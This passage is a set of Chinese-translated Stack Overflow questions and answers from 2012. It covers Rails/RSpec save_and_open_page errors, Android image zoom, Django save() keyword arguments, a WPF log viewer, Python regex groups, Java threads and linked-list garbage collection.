    AppController *app = (AppController*) [[UIApplication sharedApplication] delegate];
    [app.navController dismissModalViewControllerAnimated:YES];
} 
```

# ruby-on-rails-3.2 - save_an_open_page 无法工作 - 错误消息表明方法未找到 - 但为什么呢？

> ID：12760259
> 
> 赞同：0
> 
> 时间：2012-10-06T13:37:16.753
> 
> 标签：ruby-on-rails-3.2, rspec-rails, guard, spork

我在不同的标题下发布了这个请求，在我用信息更新请求后没有收到任何反馈。

[save_and_open_page (capybara / launchy) 在项目中停止工作 - 错误](https://stackoverflow.com/questions/12608976/save-and-open-page-capybara-launchy-stopped-working-in-a-project-error)

我正在从事一个私人项目，我是一个学习 Rails 并尝试使用 TDD/BDD 做正确的事情的开发人员，但我不得不说的这种经验让我想放弃测试，因为我根本没有花时间尝试解决环境问题。

我现在花了 24 小时的大部分时间试图解决这个问题。这些是我尝试过的事情：

1.  删除 Gemfile.lock 并重新安装包
2.  删除 gemset 并从头开始
3.  按照教程（M.Hartl 从头开始​​）重建我的部分环境

昨晚，当我从本地项目切换到开始更新 git 版本的一些功能时，--drb 选项失败了（因为我还是新手，所以我正在运行两个项目和两个 git 文件夹）。

我 [ `open_and_save_page`] 在本地项目中工作，但是当我在开始下一阶段交付之前运行我的规范以测试一切都很好时，我遇到了与 --drb 相关的失败，所以我升级了，当我转身时，这似乎消失了的守护进程。

这是当前的错误：

```
imac:Genie railsdev$ rspec spec/requests/authentication_pages_spec.rb --drb
No DRb server is running. Running in local process instead ...
/Users/railsdev/Development/railsprojects/Genie/Genie/spec/requests/authentication_pages_spec.rb:47:in `block (3 levels) in <top (required)>': undefined local variable or method `save_and_open_page' for #<Class:0x007ff51d35a8a8> (NameError)
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/example_group.rb:238:in `module_eval'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/example_group.rb:238:in `subclass'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/example_group.rb:224:in `describe'
    from /Users/railsdev/Development/railsprojects/Genie/Genie/spec/requests/authentication_pages_spec.rb:39:in `block (2 levels) in <top (required)>'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/example_group.rb:238:in `module_eval'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/example_group.rb:238:in `subclass'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/example_group.rb:224:in `describe'
    from /Users/railsdev/Development/railsprojects/Genie/Genie/spec/requests/authentication_pages_spec.rb:24:in `block in <top (required)>'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/example_group.rb:238:in `module_eval'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/example_group.rb:238:in `subclass'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/example_group.rb:224:in `describe'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/dsl.rb:18:in `describe'
    from /Users/railsdev/Development/railsprojects/Genie/Genie/spec/requests/authentication_pages_spec.rb:13:in `<top (required)>'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/configuration.rb:780:in `load'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/configuration.rb:780:in `block in load_spec_files'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/configuration.rb:780:in `map'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/configuration.rb:780:in `load_spec_files'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/command_line.rb:22:in `run'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/runner.rb:66:in `rescue in run'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/runner.rb:62:in `run'
    from /Users/railsdev/.rvm/gems/ruby-1.9.3-p125@genie-bb-v3-3/gems/rspec-core-2.11.1/lib/rspec/core/runner.rb:8:in `block in autorun'
imac:Genie railsdev$ 
```

这是我的 Gemfile：

```
source 'https://rubygems.org'

gem 'rails', '3.2.8'

# Bundle edge Rails instead:
# gem 'rails', :git => 'git://github.com/rails/rails.git'

group :development, :test do
  gem 'sqlite3', '1.3.5'
  gem "rspec-rails", "~> 2.11.0"
  gem 'guard-rspec', '~> 1.2.1'
  gem 'annotate', '~> 2.4.1.beta'
  gem 'pickle'
  gem 'launchy'
  gem 'simplecov'
  gem 'pg', '0.12.2'
end

# Gems used only for assets and not required
# in production environments by default.
group :assets do
  gem 'sass-rails',   '~> 3.2.5'
  gem 'coffee-rails', '~> 3.2.2'

  # See https://github.com/sstephenson/execjs#readme for more supported runtimes
  # gem 'therubyracer', :platform => :ruby

  gem 'uglifier', '>= 1.2.3'
  gem 'bootstrap-sass', '~> 2.0.3.1'
end

gem 'jquery-rails', '2.0.2'
gem 'bootstrap-will_paginate', '0.0.5'
gem 'bootstrap-datepicker-rails', :require => 'bootstrap-datepicker-rails'#,
                              #:git => 'git://bitbucket.org/railyboy/bootstrap-datepicker-rails.git' 
gem 'will_paginate', '3.0.3'
gem 'faker', '1.0.1'
gem 'wicked_pdf'

# To use ActiveModel has_secure_password
gem 'bcrypt-ruby', '3.0.1'

# Test gems on Macintosh OS X
group :test do
  gem 'capybara', '1.1.2'
#  gem 'rb-fsevent', '0.4.3.1', :require => false
  # gem 'rb-fsevent', :git => 'git://github.com/ttilley/rb-fsevent.git', :branch => 'pre-compiled-gem-one-off'
gem 'rb-fsevent', '~> 0.9.1', :require => false
  gem 'growl', '1.0.3'
  gem 'guard-spork', '0.3.2'
  gem 'spork', '0.9.0'
  gem 'factory_girl_rails', '~> 4.1.0'
  gem 'cucumber-rails', '1.2.1', :require => false
  gem 'database_cleaner', '0.7.0'
end 

group :production do
    gem 'pg', '0.12.2'
end 
```

.rvmrc 文件

```
rvm use ruby-1.9.3-p125@genie-bb-v3-3 --create

which rvm => /Users/railsdev/.rvm/bin/rvm

rvm -v => rvm 1.16.8 (master) by Wayne E. Seguin <wayneeseguin@gmail.com>, Michal Papis <mpapis@gmail.com> [https://rvm.io/] 
```

保护文件：

```
# A sample Guardfile
# More info at https://github.com/guard/guard#readme

require 'active_support/core_ext'

guard 'spork', :cucumber_env => { 'RAILS_ENV' => 'test' }, :rspec_env => { 'RAILS_ENV' => 'test' } do
  watch('config/application.rb')
  watch('config/environment.rb')
  watch(%r{^config/environments/.+\.rb$})
  watch(%r{^config/initializers/.+\.rb$})
  watch('Gemfile')
  watch('Gemfile.lock')
  watch('spec/spec_helper.rb')
  watch('test/test_helper.rb')
  watch('spec/support/')
end

guard 'rspec', :version => 2, :all_after_pass => false, :cli => '--drb' do
  watch(%r{^spec/.+_spec\.rb$})
  watch(%r{^lib/(.+)\.rb$}) { |m| "spec/lib/#{m[1]}_spec.rb" }  
  watch('spec/spec_helper.rb') { "spec" }

  # Rails example
  watch(%r{^app/(.+)\.rb$}) { |m| "spec/#{m[1]}_spec.rb" }
  watch(%r{^app/(.*)(\.erb|\.haml)$}) { |m| "spec/#{m[1]}#{m[2]}_spec.rb" }
  watch(%r{^lib/(.+)\.rb$}) { |m| "spec/lib/#{m[1]}_spec.rb" }
  watch(%r{^app/controllers/(.+)_(controller)\.rb$}) { |m| ["spec/routing/#{m[1]}_routing_spec.rb", "spec/#{m[2]}s/#{m[1]}_#{m[2]}_spec.rb", "spec/acceptance/#{m[1]}_spec.rb"] }
  watch(%r{^spec/support/(.+)\.rb$}) { "spec" }
  watch('spec/spec_helper.rb') { "spec" }  
  watch('config/routes.rb') { "spec/routing" }
  watch('app/controllers/application_controller.rb') { "spec/controllers" }
  # Capybara request specs 
  watch(%r{^app/views/(.+)/.*\.(erb|haml)$}) { |m| "spec/requests/#{m[1]}_spec.rb" }
  watch(%r{^app/controllers/(.+)_(controller)\.rb$}) do |m|
    ["spec/routing/#{m[1]}_routing_spec.rb",
     "spec/#{m[2]}s/#{m[1]}_#{m[2]}_spec.rb",
     "spec/acceptance/#{m[1]}_spec.rb",
     "spec/requests/#{m[1].singularize}_pages_spec.rb",
     (m[1][/_pages/] ? "spec/requests/#{m[1]}_spec.rb" :
                       "spec/requests/#{m[1].singularize}_pages_spec.rb")]
  end
  watch(%r{^app/views/(.+)/}) do |m|
    "spec/requests/#{m[1].singularize}_pages_spec.rb"
  end

  # Turnip features and steps
  watch(%r{^spec/acceptance/(.+)\.feature$})
  watch(%r{^spec/acceptance/steps/(.+)_steps\.rb$})   { |m| Dir[File.join("**/#{m[1]}.feature")][0] || 'spec/acceptance' }

end 
```

spec_helper.rb 文件：

```
require 'rubygems'
require 'spork'
#uncomment the following line to use spork with the debugger
#require 'spork/ext/ruby-debug'

Spork.prefork do
  # Loading more in this block will cause your tests to run faster. However,
  # if you change any configuration or code from libraries loaded here, you'll
  # need to restart spork for it take effect.

  # This file is copied to spec/ when you run 'rails generate rspec:install'
  ENV["RAILS_ENV"] ||= 'test'
  require File.expand_path("../../config/environment", __FILE__)
  require 'rspec/rails'
  require 'rspec/autorun'

  # Requires supporting ruby files with custom matchers and macros, etc,
  # in spec/support/ and its subdirectories.
  Dir[Rails.root.join("spec/support/**/*.rb")].each {|f| require f}

  RSpec.configure do |config|
    # ## Mock Framework
    #
    # If you prefer to use mocha, flexmock or RR, uncomment the appropriate line:
    #
    # config.mock_with :mocha
    # config.mock_with :flexmock
    # config.mock_with :rr
    config.mock_with :rspec

    # Remove this line if you're not using ActiveRecord or ActiveRecord fixtures
    config.fixture_path = "#{::Rails.root}/spec/fixtures"

    # If you're not using ActiveRecord, or you'd prefer not to run each of your
    # examples within a transaction, remove the following line or assign false
    # instead of true.
    config.use_transactional_fixtures = true

    # If true, the base class of anonymous controllers will be inferred
    # automatically. This will be the default behavior in future versions of
    # rspec-rails.
    config.infer_base_class_for_anonymous_controllers = false

    # Run specs in random order to surface order dependencies. If you find an
    # order dependency and want to debug it, you can fix the order by providing
    # the seed, which is printed after each run.
    #     --seed 1234
    config.order = "random"
  end

end

Spork.each_run do
  # This code will be run each time you run your specs.

end 
```

并且 [ `save_and_open_page`] 被调用的文件：

```
require 'spec_helper'

# describe "AuthenticationPages" do
#   describe "GET /authentication_pages" do
#     it "works! (now write some real specs)" do
#       # Run the generator again with the --webrat flag if you want to use webrat methods/matchers
#       get authentication_pages_index_path
#       response.status.should be(200)
#     end
#   end
# end

describe "Authentication" do

  subject { page }

  describe "login page" do
    before { visit login_path }

    it { should have_selector('h1',    text: 'Login') }
    it { should have_selector('title', text: 'Login') }
  end

  describe "login" do
    before { visit login_path }

    describe "with invalid information" do
      before { click_button "Login" }

      it { should have_selector('title', text: 'Login') }
      it { should have_error_message('Invalid') }

      describe "after visiting another page" do
        before { click_link "Home" }
        it { should_not have_selector('div.alert.alert-error') }
      end
    end

    describe "with valid information" do
      let(:user) { FactoryGirl.create(:user) }
      before { valid_login(user) }

      it { should have_selector('title', text: user.name) }
      #it { should have_link('Profile', href: user_path(user)) }
      it { should have_link('Logout', href: logout_path) }
      it { should_not have_link('Login', href: login_path) }
      save_and_open_page
      # it { should have_content("[#{current_user}]") }

      describe "followed by logout" do
        before { click_link "Logout" }
        it { should have_link('Login') }
      end
    end
  end

...
end 
```

我不确定我是否以正确的方式发布我的问题，因为在其他一些问题上我没有任何回应。这一切仍然是新的，这里的帮助是巨大的。所以提前谢谢。

我需要做些什么才能让它在第二个项目中发挥作用？

我确实注意到的一件事是，自从我开始将 [ `use`] 放入 .rvmrc 文件时，当我 cd 进入目录时，我得到以下内容。

```
Using /Users/railsdev/.rvm/gems/ruby-1.9.3-p125 with gemset genie-bb-v3-3
Running /Users/railsdev/.rvm/hooks/after_cd_bundler 
```

[ `open_and_save_page`] 是水豚方法吗？launchy 在哪里适合所有这些？我认为这是与黄瓜相关的宝石。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T17:54:17.900

我相信这是一个新的用户理解错误。我发现如果我将 [ `save_and_open_page`] 放在一个`it`块中，我可以让它工作。

我在阅读的任何文件中都没有看到这一点，但我想这是有道理的。

# android - 无法设置图像缩放级别并修复图像视图

> ID：12760261
> 
> 赞同：0
> 
> 时间：2012-10-06T13:37:17.570
> 
> 标签：android, image

我是 Android 的新手。我已经放大了图像视图。现在面临一些问题。1）无法设置缩放级别。2）图像也在移动。我想停止这是我的代码：

```
@Override
protected void onCreate(Bundle savedInstanceState) {

    super.onCreate(savedInstanceState);
    setContentView(R.layout.show_image);
    imageView1 = (ImageView) findViewById(R.id.showImageView1);
    imageView2 = (ImageView) findViewById(R.id.Food_pic2);
    // get image path from list View
    Intent intent = getIntent();
    int path1 = intent.getIntExtra("image1", 0);
    int path2 = intent.getIntExtra("image2", 0);
    imageView1.setImageResource(path1);
    imageView1.setOnTouchListener(this);

} 
```

这是我的触摸监听器

```
 @Override
public boolean onTouch(View v, MotionEvent event) {

    ImageView view = (ImageView) v;
    dumpEvent(event);

    // Handle touch events here...
    switch (event.getAction() & MotionEvent.ACTION_MASK) {
    case MotionEvent.ACTION_DOWN:
        savedMatrix.set(matrix);
        start.set(event.getX(), event.getY());
        Log.d(TAG, "mode=DRAG");
        mode = DRAG;
        break;
    case MotionEvent.ACTION_POINTER_DOWN:
        oldDist = spacing(event);
        Log.d(TAG, "oldDist=" + oldDist);
        if (oldDist > 10f) {
            savedMatrix.set(matrix);
            midPoint(mid, event);
            mode = ZOOM;
            Log.d(TAG, "mode=ZOOM");
        }
        break;
    case MotionEvent.ACTION_UP:
    case MotionEvent.ACTION_POINTER_UP:
        mode = NONE;
        Log.d(TAG, "mode=NONE");
        savedMatrix.set(matrix);

        break;
    case MotionEvent.ACTION_MOVE:

        if (mode == DRAG) {

            matrix.set(savedMatrix);
            matrix.postTranslate(event.getX() - start.x, event.getY()
                    - start.y);
        } else if (mode == ZOOM) {
            float newDist = spacing(event);
            Log.d(TAG, "newDist=" + newDist);
            if (newDist > 10f) {
                matrix.set(savedMatrix);
                float scale = newDist / oldDist;
                matrix.postScale(scale, scale, mid.x, mid.y);
            }
        }
        break;
    }

    view.setImageMatrix(matrix);

    return true;

}

/** Show an event in the LogCat view, for debugging */
private void dumpEvent(MotionEvent event) {
    String names[] = { "DOWN", "UP", "MOVE", "CANCEL", "OUTSIDE",
            "POINTER_DOWN", "POINTER_UP", "7?", "8?", "9?" };
    StringBuilder sb = new StringBuilder();
    int action = event.getAction();
    int actionCode = action & MotionEvent.ACTION_MASK;
    sb.append("event ACTION_").append(names[actionCode]);
    if (actionCode == MotionEvent.ACTION_POINTER_DOWN
            || actionCode == MotionEvent.ACTION_POINTER_UP) {
        sb.append("(pid ").append(
                action >> MotionEvent.ACTION_POINTER_ID_SHIFT);
        sb.append(")");
    }
    sb.append("[");
    for (int i = 0; i < event.getPointerCount(); i++) {
        sb.append("#").append(i);
        sb.append("(pid ").append(event.getPointerId(i));
        sb.append(")=").append((int) event.getX(i));
        sb.append(",").append((int) event.getY(i));
        if (i + 1 < event.getPointerCount())
            sb.append(";");
    }
    sb.append("]");
    Log.d(TAG, sb.toString());
}

/** Determine the space between the first two fingers */
private float spacing(MotionEvent event) {

    float x = event.getX(0) - event.getX(1);
    float y = event.getY(0) - event.getY(1);
    return FloatMath.sqrt(x * x + y * y);
}

/** Calculate the mid point of the first two fingers */
private void midPoint(PointF point, MotionEvent event) {
    float x = event.getX(0) + event.getX(1);
    float y = event.getY(0) + event.getY(1);
    point.set(x / 2, y / 2);
} 
```

我搜索并看到与此相关的最大值。但我无法解决我的问题。

**我如何以及在何处编写代码以设置缩放级别并停止移动我的图像视图。**

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:07:54.803

这是运动发生的地方：

```
if (mode == DRAG) {

            matrix.set(savedMatrix);
            matrix.postTranslate(event.getX() - start.x, event.getY()
                    - start.y);
        } 
```

如果你不想移动，那么在 if 块内什么也不做。

如果您也不想由用户放大或缩小，那么您也可以将此部分留空：

```
else if (mode == ZOOM) {
            float newDist = spacing(event);
            Log.d(TAG, "newDist=" + newDist);
            if (newDist > 10f) {
                matrix.set(savedMatrix);
                float scale = newDist / oldDist;
                // i edited here.
                //i  set zoom level here 
                matrix.getValues(matrixValues);
                float currentScale = matrixValues[Matrix.MSCALE_X];
                if (scale * currentScale > MAX_ZOOM) {
                    scale = MAX_ZOOM / currentScale;
                } else if (scale * currentScale < MIN_ZOOM) {
                    scale = MIN_ZOOM / currentScale;
                }

                matrix.postScale(scale, scale, mid.x, mid.y);
            }
        } 
```

如果你想设置缩放级别，就在你这样做之前，`view.setImageMatrix(matrix)`你可以使用手动缩放图像

```
matrix.postScale(val1,val2,val3,val4); 
```

使用函数内部的值来获得所需的缩放级别，因为这是设置缩放级别的函数。

# django - django 自动更新用户；save() 得到了一个意外的关键字参数“force_insert”

> ID：12760262
> 
> 赞同：14
> 
> 时间：2012-10-06T13:37:46.123
> 
> 标签：django, django-admin, auto-update

[我正在尝试为使用ModelAdmin save_model](https://docs.djangoproject.com/en/1.3/ref/contrib/admin/)创建记录的用户实现自动更新，如此[处](http://www.b-list.org/weblog/2008/dec/24/admin/)所述。我无法弄清楚如何解决 kwarg 错误“save() 有一个意外的关键字参数 'force_insert'”。

```
admin.py
from myapp.myproj.models import Activity
from django.contrib import admin

class ActivityAdmin(admin.ModelAdmin):
    exclude = ('cruser',)
    list_display = ('activity_nm', 'activity_desc', 'startdt', 'enddt','upddt','crdt')

    def save_model(self, request, obj, form, change):
        if not change:
            obj.cruser = request.user
        obj.save()

admin.site.register(Activity, ActivityAdmin) 
```

该[文件](https://docs.djangoproject.com/en/1.3/ref/contrib/admin/)指出

> “根据是否添加或更改对象，为 save_model 方法提供了 HttpRequest、模型实例、ModelForm 实例和布尔值。”

这是自动的还是我需要从视图中传递它？如果这不是问题，那还能是什么？

编辑：将代码改回以匹配示例。

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2012-10-06T13:43:34.980

*更新*

如果您有覆盖`save()`的方法`Activity`或其他一些同时保存的模型，但忘记接受`force_insert`作为关键字参数，则可能会发生此错误：

```
def save(self):
   ...
# should be
def save(self, force_insert=False, force_update=False, using=None):
    ...
# or at least
def save(self, **kwargs):
    ... 
```

检查引用以找到失败的`save`

* * *

您的代码未完全遵循 b-list.org 中的代码，请尝试：

```
def save_model(self, request, obj, form, change): 
    if not change:
        obj.cruser = request.user
    obj.save() 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2019-02-28T20:35:13.573

作为一般规则，您应该只`save()`在模型本身中覆盖该方法，而不是在某些模型管理员中。

在模型中覆盖 save() 方法时，您应该始终使用`(*args, **kwargs)`以确保安全。在保存特定模型时，您无法知道使用了哪些特定参数。

**您的`Activity`模型应该包含这样的方法：**

```
def save(self, *args, **kwargs):
    '''do your custom stuff here'''
    return super(Activity, self).save(*args, **kwargs) 
```

# c# - 带有缓冲区的 WinForms 或 WPF 控件以显示不断更新的文本

> ID：12760264
> 
> 赞同：0
> 
> 时间：2012-10-06T13:38:01.527
> 
> 标签：c#, .net, wpf, winforms, text

> **可能重复：**
> [WinForms C# 中的优雅日志窗口](https://stackoverflow.com/questions/2196097/elegant-log-window-in-winforms-c-sharp)

我需要一个日志查看器每隔几秒检查一次数据库中的新日志，并将它们附加到 WinForms 或 WPF 控件。该控件可以有一个类似于命令提示符的缓冲区，并且只保留最后的 [buffer size] 行。

我可以为此使用什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T17:25:15.643

如果您打算使用 WPF，那么[ListBox](http://msdn.microsoft.com/en-us/library/ms742521.aspx)控件可以用作显示控件。您可以使用[ListBox的](http://msdn.microsoft.com/en-us/library/ms742521.aspx)[ItemTemplate](http://www.codeproject.com/Articles/18561/Custom-ListBox-Layout-in-WPF)属性定义各种模板（基于日志类型）

这个 ListBox 可以绑定到 ViewModel/DataContext 的 Observable 集合。

然后，您可以在 viewmodel 中定义您的业务逻辑，以从 ObservableCollection 中添加/删除条目。由于绑定，ObservableCollection 中的更改将反映在 Xaml UI 中。

[注意-您可以使用任何其他项目控件，没有强制使用[列表框]](http://msdn.microsoft.com/en-us/library/ms742521.aspx)

# python - 如何使用正则表达式捕获值？

> ID：12760265
> 
> 赞同：2
> 
> 时间：2012-10-06T13:38:06.383
> 
> 标签：python, regex

我有这个字符串

```
circle,4.5
square,3.1
circle,2.0
triangle,4.7,4.9
square,4.1
circle,4.3 
```

假设我想捕获形状的名称和它旁边的两个数字。我已经尝试过了，并将评论我在其中遇到的问题：

```
>>> ma = re.search(r"(\w+)[,(\d+.\d+)]+", "Triangle,3.4,1.2")
>>> ma.group()
'Triangle,3.4,1.2'
>>> ma.group(1)
'Triangle'
>>> ma.group(2)  ##Why is this happening ???
Traceback (most recent call last):
  File "<pyshell#29>", line 1, in <module>
    ma.group(2)
IndexError: no such group 
```

我想我不能将捕获组放在方括号内？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:53:02.530

使用`.split(',')`是最简单的方法，但是，如果你想使用正则表达式，那么你应该使用

```
ma = re.search(r"^([^,]+),([^,]+)(?:,([^,]+))?", "Triangle,3.4,1.2") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T13:40:02.517

方括号有特殊含义。它们旨在创建`Character class`.. 因此，如果您放在`capture groups`方括号内，则表示匹配**group1 或 group2 或 group3** .. 它不会连续匹配所有组.. 您必须使用另一个`capture group`代替正方形括号..

但是，对于这种情况，您可以简单地使用 split ：-

```
>>> str = "Triangle,3.4,1.2"
>>> str.split(",")
['Triangle', '3.4', '1.2']
>>> 
>>> str = "circle,4.5"
>>> str.split(",")
['circle', '4.5']

>>> str.split(",")[0]
'circle'
>>> str.split(",")[1]
'4.5' 
```

根据您的正则表达式： -

```
ma = re.search(r"(\w+)[,(\d+.\d+)]+", "Triangle,3.4,1.2") 
```

您正在使用字符集`[,(\d+.\d+)]`，它匹配 -`,`或`(\d+.\d+)`..

您应该将其更改为： -

```
ma = re.search(r"(\w+)(,(\d+.\d+))+", "Triangle,3.4,1.2") 
```

但是在这种情况下存在一个问题：-

**您只创建了 3 个组：-**

```
group 0 -> complete match
group 1 -> `,1.2` (Outer bracket)
group 2 -> `1.2`  (Inner Bracket) 
```

你不会得到`3.4`因为`(,(\d+.\d+))`第一次匹配 -`,3.4`然后`,1.2`..所以，它只记得`,1.2`..

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T14:34:15.400

方括号是特殊的；他们将其中的所有字符标记为字符组。您要求匹配数字 ( `\d`)、`,`逗号、`.`句号、`(`左括号或`)`右括号。换句话说，左括号和右括号是匹配字符的一部分，*而不是*表示捕获组。

您根本不需要在这里使用字符类，您正在寻找更具体的数字模式，然后是句号，然后是另一个数字。使用非捕获组 ( `(?:...)`) 将数字格式与逗号一起分组以匹配重复的数字组：

```
r"(\w+)(?:,(\d+.\d+))+" 
```

不幸的是，这仍然不会为您捕获多个组；正则表达式永远不会产生可变数量的组。我们在这里只定义了两个组，这就是我们得到的全部：

```
>>> import re
>>> ma = re.search(r"(\w+)(?:,(\d+.\d+))+", "Triangle,3.4,1.2")
>>> ma.groups()
('Triangle', '1.2') 
```

有关遇到此限制的其他 SO 问题，请参阅[有关解析方法签名的正则表达式问题](https://stackoverflow.com/questions/4493844/regex-question-about-parsing-method-signature)和[带有捕获问题的 python 正则表达式重复。](https://stackoverflow.com/questions/6673686/python-regex-repetition-with-capture-question)

您的格式实际上非常简单，最好*不要*使用正则表达式。`,`只需用逗号分隔即可：

```
>>> "Triangle,3.4,1.2".split(',')
['Triangle', '3.4', '1.2'] 
```

# java - 并行执行多线程

> ID：12760267
> 
> 赞同：-2
> 
> 时间：2012-10-06T13:38:38.583
> 
> 标签：java, multithreading

我想并排执行多个线程。
例如：将有一个简单的计数器方法，线程将访问该方法并打印计数器值。一个线程不应该等待另一个线程在开始之前停止。

样本输出[也许]：

T1 1
T2 1
T1 2
T1 3
T1 4
T2 2
T1 5

我对多线程一无所知，只是想学习。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:46:31.593

你真的没有问任何具体的事情。如果您只是在寻找一个在两个或多个线程之间共享的非线程安全计数器的一般示例，那么您可以：

```
public class Counter extends Thread {
    private static int count = 0;

    private static int increment() {
        return ++count;  //increment the counter and return the new value
    }

    @Override
    public void run() {
        for (int times = 0; times < 1000; times++) {  //perform 1000 increments, then stop
            System.out.println(increment());  //print the counter value
        }
    }

    public static void main(String[] args) throws Exception {
        new Counter().start();   //start the first thread
        new Counter().start();   //start the second thread
        Thread.sleep(10000);     //sleep for a bit
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T13:47:30.063

如果计数器是共享的，你想要这样的东西：

```
class ThreadTask implements Runnable {
    private static AtomicInteger counter = new AtomicInteger();
    private int id;

    public ThreadTask(int id) { this.id = id; }

    public void run() {
        int local = 0;
        while((local = counter.incrementAndGet()) < 500) {
            System.out.println("T" + id + " " + local);
        }
    }
}

...

new Thread(new ThreadTask(0)).start();
new Thread(new ThreadTask(1)).start(); 
```

否则，如果你想要一个每线程计数器：

```
class ThreadTask implements Runnable {
    private int counter = 0;
    private int id;

    public ThreadTask(int id) { this.id = id; }

    public void run() {
        while(counter < 500) {
            counter++;
            System.out.println("T" + id + " " + counter);
        }
    }
}

...

new Thread(new ThreadTask(0)).start();
new Thread(new ThreadTask(1)).start(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T13:44:49.893

在没有实际问题的情况下......

我认为您可以启动多个线程并让它们访问同步的 printCounter 方法。

就像是

```
public class MyRunnable implemetns Runnable {
   private SharedObject o
   public MyRunnable(SharedObject o) {
       this.o = o;
   }
   public void run() {
       o.printCounter();  
   }
} 
```

然后开始你可以做

```
new Thread(new MyRunnable()).start();
new Thread(new MyRunnable()).start(); 
```

ETC

然后在您的 sharedObject 方法中，您希望拥有一个包含可以打印的变量的方法。这种方法也可以增加计数器。

请注意，尽管线程调度程序不保证线程何时运行。

# java - 当单链表节点变成垃圾数据？

> ID：12760270
> 
> 赞同：0
> 
> 时间：2012-10-06T13:39:09.037
> 
> 标签：java, data-structures, garbage-collection, linked-list

由于我没有机器来测试这个，我在这里需要你的帮助。

*   如果我分配`L.head = NULL`会`L`因为没有而变得空`head`吗？

*   如果我分配`L.head = L.next.next`（第三个节点）前两个节点将作为垃圾收集器（假设使用 Java）对吗？

我尝试为`cutToInteger`下面的照片编写方法如下，如果我错了，请纠正：

```
void cutToInteger (IntSLList L , int n){

    IntSLList tmp =L.head ;
    while( tmp != NULL || !tmp.into.equals(n)){
            tmp=tmp.next;
    }
    L.head = tmp;
} 
```

实现似乎很容易，但节点成为垃圾数据以被删除的逻辑总是让我感到困惑。

![在此处输入图像描述](../Images/dc4cda7a9f261d8537c31445d1ccc278.png)

更新：这是上面截图的问题

**一个方法 void cutToNumber(IntSLList L, int n) 从头开始​​切割一个整数单链表 L，直到它到达整数 n。如果 n 不在 L 中，则列表为空。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:59:39.570

你想这个太难了。当没有对它的字符串引用时，对象变为可收集的。

在您的示例中，当您不再有对该对象的任何引用时，它变得可收集。没有比这更复杂的了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:00:24.230

（在下面的文本中，“reachable”是“reachable if `IntSLList`object is reachable”的简写。）

> 如果我分配 L.head = NULL ， L 会因为没有 head 而变空吗？

这取决于您的链表的定义。您的图表包含一个尾指针，因此除非对该尾指针进行更新，否则最后一个元素将保持可访问（因此不会被垃圾收集）。但是由于其他节点无法从最后一个节点访问，它们可能（假设没有其他对它们的引用）变得无法访问，因此有资格进行垃圾收集。

> 如果我分配 L.head = L.next.next(3rd node) 前两个节点将作为垃圾收集器（假设使用 Java）对吗？

是的，出于同样的原因，仍然假设没有其他对这两个节点的引用。

> 一个方法 void cutToNumber(IntSLList L, int n) 从头开始​​切割一个整数单链表 L，直到它到达整数 n。如果 n 不在 L 中，则列表为空。

和以前一样，尾部保持不变，因此至少最后一个节点将保持可达，尽管所有其他节点可能变得不可达。

请注意，您的代码包含一个错误，条件应包含逻辑和，而不是逻辑或，以在到达结尾时正确停止（现在，它将评估第二个条件，如果`tmp == null`并且您将从该`tmp.into`位获得 NPE） . 当然，没有头部但有尾部的列表非常令人困惑（我敢说这是一个错误）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T14:02:27.353

1.  在你的循环中它应该是`&&`运算符而不是`||`，否则它总是只会在链接的末尾停止。

2.  `n`是`int`，所以你必须使用`==\!=`运算符来与其他比较`int`。

该方法应该类似于：

```
void cutToInteger (IntSLList L , int n){    
    IntSLList tmp =L.head;
